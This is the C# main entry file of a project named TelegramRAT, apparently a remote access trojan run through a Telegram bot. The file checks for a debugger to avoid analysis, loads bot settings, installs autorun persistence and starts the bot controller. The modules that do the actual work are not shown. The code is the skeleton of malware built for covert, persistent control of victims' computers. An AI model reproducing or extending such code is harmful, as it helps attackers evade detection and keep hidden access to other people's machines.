namespace TelegramRAT;

using TelegramRAT.Config;
using TelegramRAT.Core;
using TelegramRAT.Persistence;
using TelegramRAT.Stealth;

internal static class Program
{
    private static async Task Main()
    {
        if (AntiDebug.IsDebuggerPresent())
            return;

        var config = BotConfig.Load();

        if (config.EnablePersistence)
            AutoRun.Install();

        var controller = new BotController(config);
        await controller.StartAsync();
    }
}
